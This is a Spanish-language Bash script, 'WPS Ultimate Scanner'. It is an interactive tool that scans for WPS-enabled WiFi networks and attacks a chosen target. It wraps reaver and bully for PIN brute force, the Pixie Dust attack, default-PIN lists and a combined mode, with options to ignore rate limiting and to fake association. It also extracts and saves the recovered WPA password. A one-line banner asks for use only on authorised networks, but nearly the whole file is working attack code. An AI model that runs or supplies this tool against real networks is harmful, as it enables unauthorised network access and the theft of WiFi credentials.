#!/bin/bash

# 🔐 WPS ULTIMATE SCANNER
# Detección y ataques WPS con múltiples métodos

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
INTERFACE=""
TARGET_BSSID=""
TARGET_ESSID=""
WPS_PIN=""
ATTACK_TYPE=""
OUTPUT_DIR=""

print_banner() {
    clear
    echo -e "${BLUE}"
    echo "██╗    ██╗██████╗ ███████╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗"
    echo "██║    ██║██╔══██╗██╔════╝    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝"
    echo "██║ █╗ ██║██████╔╝███████╗    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  "
    echo "██║███╗██║██╔═══╝ ╚════██║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  "
    echo "╚███╔███╔╝██║     ███████║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗"
    echo " ╚══╝╚══╝ ╚═╝     ╚══════╝     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}🔐 WPS Ultimate - Detección y Ataques WPS Avanzados${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en redes propias o con autorización${NC}"
    echo ""
}

check_interface() {
    echo -e "${YELLOW}🔍 Verificando interface WiFi...${NC}"
    
    # Detectar interfaces WiFi
    local wifi_interfaces=($(iwconfig 2>/dev/null | grep -E "^[a-z].*IEEE 802.11" | cut -d' ' -f1))
    
    if [[ ${#wifi_interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}❌ No se detectaron interfaces WiFi${NC}"
        return 1
    fi
    
    echo -e "${CYAN}📡 Interfaces WiFi disponibles:${NC}"
    for i in "${!wifi_interfaces[@]}"; do
        local iface="${wifi_interfaces[$i]}"
        local mode=$(iwconfig "$iface" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
        echo -e "  ${CYAN}$((i+1)).${NC} $iface (Modo: $mode)"
    done
    
    read -p "🎯 Selecciona interface (1-${#wifi_interfaces[@]}): " iface_choice
    
    if [[ "$iface_choice" -ge 1 && "$iface_choice" -le ${#wifi_interfaces[@]} ]]; then
        INTERFACE="${wifi_interfaces[$((iface_choice-1))]}"
    else
        INTERFACE="${wifi_interfaces[0]}"
    fi
    
    # Verificar/activar modo monitor
    local current_mode=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
    
    if [[ "$current_mode" != "Monitor" ]]; then
        echo -e "${YELLOW}⚠️ Interface no está en modo monitor${NC}"
        read -p "¿Activar modo monitor? (Y/n): " activate_monitor
        
        if [[ $activate_monitor != [nN] ]]; then
            echo -e "${CYAN}🔧 Activando modo monitor...${NC}"
            sudo airmon-ng stop "$INTERFACE" 2>/dev/null
            sudo airmon-ng start "$INTERFACE" 2>/dev/null
            
            # Buscar nueva interface monitor
            local monitor_iface=$(iwconfig 2>/dev/null | grep -E "Mode:Monitor" | cut -d' ' -f1)
            if [[ -n "$monitor_iface" ]]; then
                INTERFACE="$monitor_iface"
                echo -e "${GREEN}✅ Modo monitor activado: $INTERFACE${NC}"
            else
                echo -e "${RED}❌ No se pudo activar modo monitor${NC}"
                return 1
            fi
        fi
    else
        echo -e "${GREEN}✅ Interface en modo monitor: $INTERFACE${NC}"
    fi
}

scan_wps_networks() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}          ${YELLOW}ESCANEO DE REDES WPS${NC}           ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    local scan_file="/tmp/wps_scan_$(date +%H%M%S)"
    
    echo -e "${CYAN}📡 Escaneando redes con WPS habilitado...${NC}"
    echo -e "${YELLOW}⏳ Presiona Ctrl+C después de 30 segundos${NC}"
    
    # Escanear con wash (detecta WPS)
    if command -v wash &> /dev/null; then
        echo -e "${BLUE}🔍 Usando wash para detectar WPS...${NC}"
        timeout 30 wash -i "$INTERFACE" 2>/dev/null | tee "$scan_file" || true
    else
        echo -e "${YELLOW}⚠️ wash no disponible, usando airodump-ng...${NC}"
        timeout 30 sudo airodump-ng "$INTERFACE" --write "$scan_file" --output-format csv 2>/dev/null || true
    fi
    
    # Procesar resultados
    if [[ -f "$scan_file" ]]; then
        echo -e "\n${GREEN}🔐 Redes con WPS detectadas:${NC}"
        echo -e "${BLUE}ID  BSSID             ESSID                    CH  PWR  WPS  LOCK${NC}"
        echo -e "${BLUE}──  ─────────────────  ───────────────────────  ──  ───  ───  ────${NC}"
        
        local counter=1
        declare -A networks_map
        
        # Filtrar líneas válidas de wash
        while read -r line; do
            if [[ "$line" == *":"* && "$line" != *"BSSID"* ]]; then
                local bssid=$(echo "$line" | awk '{print $1}')
                local channel=$(echo "$line" | awk '{print $2}')
                local power=$(echo "$line" | awk '{print $3}')
                local wps=$(echo "$line" | awk '{print $4}')
                local lock=$(echo "$line" | awk '{print $5}')
                local essid=$(echo "$line" | awk '{for(i=6;i<=NF;i++) printf "%s ", $i; print ""}' | sed 's/[[:space:]]*$//')
                
                if [[ -n "$bssid" && "$bssid" != "00:00:00:00:00:00" ]]; then
                    printf "${CYAN}%2d${NC}  %-17s  %-23s  %2s  %3s  %3s  %s\n" "$counter" "$bssid" "$essid" "$channel" "$power" "$wps" "$lock"
                    networks_map["$counter"]="$bssid|$essid|$channel|$wps|$lock"
                    ((counter++))
                fi
            fi
        done < "$scan_file"
        
        if [[ $counter -eq 1 ]]; then
            echo -e "${YELLOW}⚠️ No se detectaron redes con WPS${NC}"
            return 1
        fi
        
        echo ""
        read -p "🎯 Selecciona red objetivo (1-$((counter-1))): " network_choice
        
        if [[ -n "${networks_map[$network_choice]}" ]]; then
            local network_info="${networks_map[$network_choice]}"
            TARGET_BSSID=$(echo "$network_info" | cut -d'|' -f1)
            TARGET_ESSID=$(echo "$network_info" | cut -d'|' -f2)
            local target_channel=$(echo "$network_info" | cut -d'|' -f3)
            local wps_version=$(echo "$network_info" | cut -d'|' -f4)
            local wps_locked=$(echo "$network_info" | cut -d'|' -f5)
            
            echo -e "${GREEN}✅ Objetivo seleccionado:${NC}"
            echo -e "  📡 BSSID: ${CYAN}$TARGET_BSSID${NC}"
            echo -e "  📝 ESSID: ${CYAN}$TARGET_ESSID${NC}"
            echo -e "  📻 Canal: ${CYAN}$target_channel${NC}"
            echo -e "  🔐 WPS: ${CYAN}$wps_version${NC}"
            echo -e "  🔒 Lock: ${CYAN}$wps_locked${NC}"
            
            # Fijar canal
            sudo iwconfig "$INTERFACE" channel "$target_channel" 2>/dev/null
            
            # Advertir si está bloqueado
            if [[ "$wps_locked" == *"Yes"* || "$wps_locked" == *"Lock"* ]]; then
                echo -e "${YELLOW}⚠️ WPS parece estar bloqueado - algunos ataques pueden no funcionar${NC}"
            fi
        else
            echo -e "${RED}❌ Selección inválida${NC}"
            return 1
        fi
    else
        echo -e "${RED}❌ No se generaron resultados del scan${NC}"
        return 1
    fi
    
    rm -f "$scan_file"*
}

select_wps_attack() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}         ${YELLOW}MÉTODO DE ATAQUE WPS${NC}           ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué método de ataque WPS quieres usar?${NC}"
    echo -e "  ${CYAN}1.${NC} 🔓 Detectar WPS activo ${PURPLE}[wash]${NC}"
    echo -e "  ${CYAN}2.${NC} 💥 Fuerza bruta PIN WPS ${PURPLE}[reaver + bully]${NC}"
    echo -e "  ${CYAN}3.${NC} 📋 Ataque con PIN conocido"
    echo -e "  ${CYAN}4.${NC} 🔄 Ataque Pixie Dust ${PURPLE}[reaver -K]${NC}"
    echo -e "  ${CYAN}5.${NC} ⚡ Ataque combinado (todos los métodos)"
    echo -e "  ${CYAN}6.${NC} 🎯 Ataque personalizado avanzado"
    echo ""
    
    read -p "Selecciona ataque (1-6): " attack_choice
    
    case $attack_choice in
        1)
            ATTACK_TYPE="detect"
            echo -e "${GREEN}✅ Detección WPS seleccionada${NC}"
            ;;
        2)
            ATTACK_TYPE="bruteforce"
            echo -e "${GREEN}✅ Fuerza bruta PIN WPS${NC}"
            ;;
        3)
            ATTACK_TYPE="known_pin"
            echo -e "${GREEN}✅ Ataque con PIN conocido${NC}"
            select_known_pin
            ;;
        4)
            ATTACK_TYPE="pixie_dust"
            echo -e "${GREEN}✅ Ataque Pixie Dust${NC}"
            ;;
        5)
            ATTACK_TYPE="combined"
            echo -e "${GREEN}✅ Ataque combinado${NC}"
            ;;
        6)
            select_custom_wps_attack
            ;;
        *)
            echo -e "${YELLOW}Usando fuerza bruta por defecto${NC}"
            ATTACK_TYPE="bruteforce"
            ;;
    esac
}

select_known_pin() {
    echo -e "\n${CYAN}🔑 Configuración de PIN conocido:${NC}"
    
    echo -e "${YELLOW}¿Cómo quieres especificar el PIN?${NC}"
    echo -e "  ${CYAN}1.${NC} Ingresar PIN manualmente"
    echo -e "  ${CYAN}2.${NC} Usar PINs por defecto comunes"
    echo -e "  ${CYAN}3.${NC} Cargar desde archivo"
    echo ""
    
    read -p "Selecciona opción (1-3): " pin_choice
    
    case $pin_choice in
        1)
            read -p "🔢 Ingresa PIN WPS (8 dígitos): " WPS_PIN
            if [[ ${#WPS_PIN} -ne 8 || ! "$WPS_PIN" =~ ^[0-9]+$ ]]; then
                echo -e "${YELLOW}⚠️ PIN debe ser de 8 dígitos numéricos${NC}"
                WPS_PIN=""
            fi
            ;;
        2)
            echo -e "${CYAN}📋 PINs comunes por defecto:${NC}"
            echo -e "  1. 12345670"
            echo -e "  2. 00000000" 
            echo -e "  3. 11111111"
            echo -e "  4. 12345678"
            echo -e "  5. 87654321"
            echo -e "  6. Todos los anteriores"
            
            read -p "Selecciona PIN (1-6): " default_pin_choice
            case $default_pin_choice in
                1) WPS_PIN="12345670" ;;
                2) WPS_PIN="00000000" ;;
                3) WPS_PIN="11111111" ;;
                4) WPS_PIN="12345678" ;;
                5) WPS_PIN="87654321" ;;
                6) WPS_PIN="default_list" ;;
                *) WPS_PIN="12345670" ;;
            esac
            ;;
        3)
            read -p "📁 Ruta del archivo con PINs: " pin_file
            if [[ -f "$pin_file" ]]; then
                WPS_PIN="file:$pin_file"
                echo -e "${GREEN}✅ Archivo de PINs cargado${NC}"
            else
                echo -e "${RED}❌ Archivo no encontrado${NC}"
                WPS_PIN=""
            fi
            ;;
        *)
            WPS_PIN="12345670"
            ;;
    esac
    
    if [[ -n "$WPS_PIN" && "$WPS_PIN" != "default_list" && "$WPS_PIN" != file:* ]]; then
        echo -e "${GREEN}✅ PIN configurado: $WPS_PIN${NC}"
    fi
}

select_custom_wps_attack() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}ATAQUE WPS PERSONALIZADO${NC}       ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}Configuración personalizada:${NC}"
    
    # Seleccionar herramienta
    echo -e "\n${CYAN}🔧 Herramienta principal:${NC}"
    echo -e "  1. Reaver (más estable)"
    echo -e "  2. Bully (más agresivo)"
    echo -e "  3. Ambas (prueba secuencial)"
    read -p "Herramienta (1-3): " tool_choice
    
    # Configurar parámetros
    echo -e "\n${CYAN}⚙️ Parámetros de ataque:${NC}"
    read -p "🕐 Timeout por PIN (segundos, default 10): " timeout
    read -p "🔄 Delay entre PINs (segundos, default 1): " delay
    read -p "🔁 Reintentos por PIN (default 3): " retries
    
    # Configurar filtros
    echo -e "\n${CYAN}🔍 Filtros avanzados:${NC}"
    read -p "¿Usar solo Pixie Dust? (y/N): " pixie_only
    read -p "¿Ignorar rate limiting? (y/N): " ignore_rate_limit
    read -p "¿Usar asociación falsa? (y/N): " fake_assoc
    
    ATTACK_TYPE="custom"
    
    # Crear configuración personalizada
    cat > "/tmp/wps_custom_config" << EOF
TOOL_CHOICE=$tool_choice
TIMEOUT=${timeout:-10}
DELAY=${delay:-1}
RETRIES=${retries:-3}
PIXIE_ONLY=$pixie_only
IGNORE_RATE_LIMIT=$ignore_rate_limit
FAKE_ASSOC=$fake_assoc
EOF
    
    echo -e "${GREEN}✅ Configuración personalizada guardada${NC}"
}

setup_output_directory() {
    OUTPUT_DIR="wps_attack_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{captures,results,logs}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# WPS Attack Info - $(date)
Interface: $INTERFACE
Target BSSID: $TARGET_BSSID
Target ESSID: $TARGET_ESSID
Attack Type: $ATTACK_TYPE
WPS PIN: $WPS_PIN
Started: $(date)
EOF
}

execute_wps_detection() {
    echo -e "\n${YELLOW}🔓 Ejecutando detección WPS avanzada...${NC}"
    
    local detection_file="$OUTPUT_DIR/results/wps_detection.txt"
    
    echo -e "${CYAN}🔍 Analizando WPS en $TARGET_ESSID...${NC}"
    
    {
        echo "=== WPS DETECTION REPORT - $(date) ==="
        echo "Target: $TARGET_ESSID ($TARGET_BSSID)"
        echo ""
        
        # Usar wash para análisis detallado
        if command -v wash &> /dev/null; then
            echo "=== WASH ANALYSIS ==="
            timeout 30 wash -i "$INTERFACE" -s "$TARGET_BSSID" 2>/dev/null || echo "Wash scan completed"
            echo ""
        fi
        
        # Usar airodump para información adicional
        echo "=== AIRODUMP ANALYSIS ==="
        timeout 15 sudo airodump-ng "$INTERFACE" --bssid "$TARGET_BSSID" 2>/dev/null || echo "Airodump scan completed"
        
    } | tee "$detection_file"
    
    echo -e "${GREEN}✅ Detección completada${NC}"
    echo -e "${CYAN}📄 Resultados guardados en: $detection_file${NC}"
}

execute_reaver_attack() {
    echo -e "\n${YELLOW}⚡ Ejecutando ataque Reaver...${NC}"
    
    if ! command -v reaver &> /dev/null; then
        echo -e "${RED}❌ Reaver no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install reaver${NC}"
        return 1
    fi
    
    local reaver_log="$OUTPUT_DIR/logs/reaver_attack.log"
    local reaver_output="$OUTPUT_DIR/results/reaver_results.txt"
    
    echo -e "${CYAN}🔓 Iniciando ataque Reaver contra $TARGET_ESSID...${NC}"
    
    # Construir comando reaver
    local reaver_cmd="reaver -i $INTERFACE -b $TARGET_BSSID -vv"
    
    # Agregar parámetros según el tipo de ataque
    if [[ "$ATTACK_TYPE" == "pixie_dust" ]]; then
        reaver_cmd="$reaver_cmd -K 1"  # Pixie dust attack
        echo -e "${PURPLE}💫 Usando ataque Pixie Dust${NC}"
    fi
    
    if [[ -f "/tmp/wps_custom_config" ]]; then
        source "/tmp/wps_custom_config"
        reaver_cmd="$reaver_cmd -t $TIMEOUT -d $DELAY -x $RETRIES"
        
        [[ "$IGNORE_RATE_LIMIT" == [yY]* ]] && reaver_cmd="$reaver_cmd -L"
        [[ "$FAKE_ASSOC" == [yY]* ]] && reaver_cmd="$reaver_cmd -A"
    fi
    
    # Agregar PIN específico si está configurado
    if [[ -n "$WPS_PIN" && "$WPS_PIN" != "default_list" && "$WPS_PIN" != file:* ]]; then
        reaver_cmd="$reaver_cmd -p $WPS_PIN"
        echo -e "${CYAN}🔑 Usando PIN específico: $WPS_PIN${NC}"
    fi
    
    echo -e "${BLUE}Comando: $reaver_cmd${NC}"
    echo -e "${YELLOW}⏳ Ejecutando ataque (esto puede tomar tiempo)...${NC}"
    
    # Ejecutar reaver
    eval "$reaver_cmd" 2>&1 | tee "$reaver_log"
    
    # Procesar resultados
    process_reaver_results "$reaver_log"
}

execute_bully_attack() {
    echo -e "\n${YELLOW}💥 Ejecutando ataque Bully...${NC}"
    
    if ! command -v bully &> /dev/null; then
        echo -e "${RED}❌ Bully no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install bully${NC}"
        return 1
    fi
    
    local bully_log="$OUTPUT_DIR/logs/bully_attack.log"
    
    echo -e "${CYAN}💥 Iniciando ataque Bully contra $TARGET_ESSID...${NC}"
    
    # Construir comando bully
    local bully_cmd="bully $INTERFACE -b $TARGET_BSSID -v 3"
    
    if [[ -f "/tmp/wps_custom_config" ]]; then
        source "/tmp/wps_custom_config"
        bully_cmd="$bully_cmd -T $TIMEOUT -d $DELAY"
    fi
    
    # PIN específico
    if [[ -n "$WPS_PIN" && "$WPS_PIN" != "default_list" && "$WPS_PIN" != file:* ]]; then
        bully_cmd="$bully_cmd -p $WPS_PIN"
    fi
    
    echo -e "${BLUE}Comando: $bully_cmd${NC}"
    echo -e "${YELLOW}⏳ Ejecutando ataque Bully...${NC}"
    
    # Ejecutar bully
    eval "$bully_cmd" 2>&1 | tee "$bully_log"
    
    # Procesar resultados
    process_bully_results "$bully_log"
}

execute_known_pin_attack() {
    echo -e "\n${YELLOW}🔑 Ejecutando ataque con PIN conocido...${NC}"
    
    if [[ "$WPS_PIN" == "default_list" ]]; then
        local default_pins=("12345670" "00000000" "11111111" "12345678" "87654321")
        
        for pin in "${default_pins[@]}"; do
            echo -e "\n${CYAN}🔍 Probando PIN: $pin${NC}"
            WPS_PIN="$pin"
            execute_reaver_attack
            
            # Verificar si se encontró la contraseña
            if [[ -f "$OUTPUT_DIR/results/password_found.txt" ]]; then
                echo -e "${GREEN}🎉 ¡Contraseña encontrada con PIN: $pin!${NC}"
                break
            fi
            
            sleep 5
        done
    elif [[ "$WPS_PIN" == file:* ]]; then
        local pin_file="${WPS_PIN#file:}"
        
        echo -e "${CYAN}📋 Probando PINs desde archivo: $pin_file${NC}"
        
        while read -r pin; do
            [[ -z "$pin" || "$pin" == \#* ]] && continue
            
            echo -e "\n${CYAN}🔍 Probando PIN: $pin${NC}"
            WPS_PIN="$pin"
            execute_reaver_attack
            
            # Verificar si se encontró la contraseña
            if [[ -f "$OUTPUT_DIR/results/password_found.txt" ]]; then
                echo -e "${GREEN}🎉 ¡Contraseña encontrada con PIN: $pin!${NC}"
                break
            fi
            
            sleep 5
        done < "$pin_file"
    else
        execute_reaver_attack
    fi
}

execute_combined_attack() {
    echo -e "\n${YELLOW}🔥 Ejecutando ataque combinado...${NC}"
    
    echo -e "${BLUE}Fase 1: Pixie Dust attack...${NC}"
    ATTACK_TYPE="pixie_dust"
    execute_reaver_attack
    sleep 10
    
    # Verificar si ya se encontró
    if [[ -f "$OUTPUT_DIR/results/password_found.txt" ]]; then
        echo -e "${GREEN}🎉 ¡Contraseña encontrada con Pixie Dust!${NC}"
        return 0
    fi
    
    echo -e "\n${BLUE}Fase 2: Ataque con PINs por defecto...${NC}"
    WPS_PIN="default_list"
    execute_known_pin_attack
    
    # Verificar si se encontró
    if [[ -f "$OUTPUT_DIR/results/password_found.txt" ]]; then
        return 0
    fi
    
    echo -e "\n${BLUE}Fase 3: Fuerza bruta con Reaver...${NC}"
    ATTACK_TYPE="bruteforce"
    WPS_PIN=""
    execute_reaver_attack
    sleep 10
    
    echo -e "\n${BLUE}Fase 4: Fuerza bruta con Bully...${NC}"
    execute_bully_attack
    
    echo -e "\n${GREEN}✅ Ataque combinado completado${NC}"
}

process_reaver_results() {
    local log_file="$1"
    
    echo -e "\n${CYAN}📊 Procesando resultados de Reaver...${NC}"
    
    # Buscar contraseña en el log
    local password=$(grep -i "WPA PSK" "$log_file" | tail -1 | sed 's/.*WPA PSK: //')
    local pin=$(grep -i "WPS PIN" "$log_file" | tail -1 | sed 's/.*WPS PIN: //')
    
    if [[ -n "$password" ]]; then
        echo -e "${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA!${NC}"
        echo -e "${YELLOW}🔑 Contraseña WPA: $password${NC}"
        
        if [[ -n "$pin" ]]; then
            echo -e "${YELLOW}📍 PIN WPS: $pin${NC}"
        fi
        
        # Guardar resultados
        {
            echo "=== WPS ATTACK SUCCESS - $(date) ==="
            echo "Target: $TARGET_ESSID ($TARGET_BSSID)"
            echo "WPA Password: $password"
            [[ -n "$pin" ]] && echo "WPS PIN: $pin"
            echo "Method: Reaver"
            echo "Attack Type: $ATTACK_TYPE"
        } > "$OUTPUT_DIR/results/password_found.txt"
        
        echo -e "${CYAN}💾 Contraseña guardada en: $OUTPUT_DIR/results/password_found.txt${NC}"
    else
        # Buscar otros indicadores
        local progress=$(grep -c "Sending EAPOL START request" "$log_file" 2>/dev/null || echo "0")
        local attempts=$(grep -c "Trying pin" "$log_file" 2>/dev/null || echo "0")
        
        echo -e "${YELLOW}⏳ No se encontró contraseña aún${NC}"
        echo -e "  📈 Progreso: $progress intentos de handshake"
        echo -e "  🔢 PINs probados: $attempts"
        
        # Verificar errores comunes
        if grep -q "rate limiting" "$log_file"; then
            echo -e "${RED}⚠️ Rate limiting detectado - el AP está limitando intentos${NC}"
        fi
        
        if grep -q "timeout" "$log_file"; then
            echo -e "${YELLOW}⏳ Timeouts detectados - conexión lenta${NC}"
        fi
        
        if grep -q "locked" "$log_file"; then
            echo -e "${RED}🔒 WPS bloqueado - no se pueden enviar más PINs${NC}"
        fi
    fi
}

process_bully_results() {
    local log_file="$1"
    
    echo -e "\n${CYAN}📊 Procesando resultados de Bully...${NC}"
    
    # Buscar contraseña en el log
    local password=$(grep -i "KEY:" "$log_file" | tail -1 | sed 's/.*KEY: //')
    local pin=$(grep -i "PIN:" "$log_file" | tail -1 | sed 's/.*PIN: //')
    
    if [[ -n "$password" ]]; then
        echo -e "${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA CON BULLY!${NC}"
        echo -e "${YELLOW}🔑 Contraseña WPA: $password${NC}"
        
        if [[ -n "$pin" ]]; then
            echo -e "${YELLOW}📍 PIN WPS: $pin${NC}"
        fi
        
        # Guardar resultados
        {
            echo "=== WPS ATTACK SUCCESS - $(date) ==="
            echo "Target: $TARGET_ESSID ($TARGET_BSSID)"
            echo "WPA Password: $password"
            [[ -n "$pin" ]] && echo "WPS PIN: $pin"
            echo "Method: Bully" 
            echo "Attack Type: $ATTACK_TYPE"
        } > "$OUTPUT_DIR/results/password_found.txt"
        
        echo -e "${CYAN}💾 Contraseña guardada en: $OUTPUT_DIR/results/password_found.txt${NC}"
    else
        echo -e "${YELLOW}⏳ Bully no encontró contraseña${NC}"
    fi
}

show_results_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                        ${YELLOW}RESUMEN DE RESULTADOS${NC}                          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$TARGET_BSSID" ]]; then
        echo -e "\n${GREEN}🎯 Objetivo atacado:${NC}"
        echo -e "  📡 BSSID: $TARGET_BSSID"
        echo -e "  📝 ESSID: $TARGET_ESSID"
        echo -e "  🔧 Método: $ATTACK_TYPE"
    fi
    
    # Verificar si se encontró contraseña
    if [[ -f "$OUTPUT_DIR/results/password_found.txt" ]]; then
        echo -e "\n${GREEN}🎉 ¡ATAQUE EXITOSO!${NC}"
        echo -e "${CYAN}📄 Ver detalles en: $OUTPUT_DIR/results/password_found.txt${NC}"
        
        # Mostrar contraseña si existe
        local password=$(grep "WPA Password:" "$OUTPUT_DIR/results/password_found.txt" | cut -d':' -f2- | sed 's/^ *//')
        if [[ -n "$password" ]]; then
            echo -e "${YELLOW}🔑 Contraseña: $password${NC}"
        fi
    else
        echo -e "\n${YELLOW}⏳ No se encontró contraseña${NC}"
        echo -e "${CYAN}💡 Revisa los logs para más información${NC}"
    fi
    
    echo -e "\n${CYAN}📊 Archivos generados:${NC}"
    find "$OUTPUT_DIR" -type f 2>/dev/null | while read file; do
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local rel_path=${file#$OUTPUT_DIR/}
        echo -e "  📄 $rel_path ($size)"
    done
}

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  🔧 Configurar Interface WiFi                                    ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  🔍 Escanear Redes con WPS                                      ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  🔓 Detectar WPS Activo                                          ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  ⚡ Fuerza Bruta PIN WPS                                         ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  🔑 Ataque con PIN Conocido                                      ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  💫 Ataque Pixie Dust                                            ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  🔥 Ataque Combinado (todos los métodos)                        ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}8.${NC}  📊 Ver Resumen de Resultados                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$INTERFACE" ]]; then
            echo -e "\n${GREEN}📡 Interface: $INTERFACE${NC}"
        fi
        
        if [[ -n "$TARGET_BSSID" ]]; then
            echo -e "${GREEN}🎯 Objetivo: $TARGET_ESSID ($TARGET_BSSID)${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-8): " choice
        
        case $choice in
            1) check_interface ;;
            2) 
                [[ -z "$INTERFACE" ]] && check_interface
                scan_wps_networks
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_wps_networks
                ATTACK_TYPE="detect"
                setup_output_directory
                execute_wps_detection
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_wps_networks
                ATTACK_TYPE="bruteforce"
                setup_output_directory
                execute_reaver_attack
                execute_bully_attack
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            5)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_wps_networks
                ATTACK_TYPE="known_pin"
                select_known_pin
                setup_output_directory
                execute_known_pin_attack
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_wps_networks
                ATTACK_TYPE="pixie_dust"
                setup_output_directory
                execute_reaver_attack
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                [[ -z "$INTERFACE" ]] && check_interface
                [[ -z "$TARGET_BSSID" ]] && scan_wps_networks
                echo -e "${YELLOW}🔥 Ejecutando ataque combinado...${NC}"
                setup_output_directory
                execute_combined_attack
                show_results_summary
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_results_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

# Verificar herramientas necesarias
missing_tools=()
for tool in aircrack-ng iwconfig; do
    if ! command -v "$tool" &> /dev/null; then
        missing_tools+=("$tool")
    fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
    echo -e "${RED}❌ Herramientas faltantes: ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install aircrack-ng wireless-tools reaver bully${NC}"
    exit 1
fi

# Verificar permisos de root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ Se requieren permisos de root para ataques WPS${NC}"
    echo -e "${CYAN}💡 Ejecuta como: sudo $0${NC}"
    read -p "¿Continuar de todos modos? (y/N): " continue_anyway
    [[ $continue_anyway != [yY] ]] && exit 1
fi

# Ejecutar menú principal
main_menu